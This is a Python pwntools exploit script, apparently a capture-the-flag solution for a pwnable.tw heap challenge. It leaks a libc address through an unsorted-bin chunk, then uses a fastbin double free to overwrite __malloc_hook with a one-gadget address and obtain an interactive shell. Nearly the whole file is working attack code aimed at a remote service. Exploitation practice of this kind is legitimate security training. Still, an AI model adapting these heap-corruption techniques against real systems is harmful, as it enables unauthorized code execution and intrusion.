#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hal

from pwn import *

context.log_level = "debug"
context.terminal = ['tmux', 'split', '-h']

pwn_file = ("./pwn")
elf = ELF(pwn_file)
libc = ELF("./bc.so.6")

if len(sys.argv) == 1:
    r = process(pwn_file)
    pid = r.pid
else:
    r = remote("chall.pwnable.tw", 10203)
    pid = 0

def debug():
    gdb.attach(r)

def add(size, name=0, color=0):
    r.sendlineafter(": ", '1')
    r.sendlineafter(":", str(size))
    r.sendafter(":", name)
    r.sendafter(":", color)

def show():
    r.sendlineafter(": ", '2')

def remove(idx):
    r.sendlineafter(": ", '3')
    r.sendlineafter(":", str(idx))

def clean():
    r.sendlineafter(": ", '4')

# use unsortedbin to leak libc address
add(0x200, 'a', 'a\n')
add(0x20, 'a', 'a\n')
remove(0)
add(0x60, 'x', 'a\n')

show()
r.recvuntil("x")
a = u64('x' + r.recv(5) + '\x00\x00') - 0x3c3b78
libc.address = a
info("libc: " + hex(a))

# double free to get shell
add(0x60, 'y', 'a\n')
remove(2)
remove(3)
remove(2)
add(0x60, p64(libc.sym['__malloc_hook'] - 0x23), 'a\n')
add(0x60, 'a', 'a\n')
add(0x60, 'a', 'a\n')
add(0x60, '\x00'*0x13 + p64(a + 0xef6c4), 'a\n')

remove(0)
remove(0)

r.interactive()
